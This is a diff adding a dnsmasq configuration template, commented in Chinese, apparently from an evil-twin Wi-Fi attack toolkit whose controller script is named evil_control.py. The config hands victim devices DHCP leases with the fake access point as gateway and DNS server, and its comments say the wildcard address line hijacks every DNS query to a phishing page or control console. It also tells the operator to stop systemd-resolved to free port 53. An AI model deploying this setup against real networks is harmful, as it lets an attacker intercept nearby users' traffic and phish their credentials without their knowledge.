@@ -1,0 +1,12 @@
+# dnsmasq 配置模板（攻击时由 evil_control.py 动态生成，此文件供参考）
+# 核心: address=/#/10.0.0.1 把所有域名解析劫持到钓鱼网关
+interface=wlxYOUR_USB_WIFI_IFACE
+dhcp-range=10.0.0.10,10.0.0.100,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+address=/#/10.0.0.1
+no-resolv
+# 说明:
+#   - DHCP 给受害设备分配 10.0.0.x, 网关/DNS 指向假 AP
+#   - address=/#/ 劫持一切 DNS 查询到 10.0.0.1 (钓鱼页/控制台)
+#   - 53 端口被 systemd-resolved 占用时需先停: systemctl stop systemd-resolved
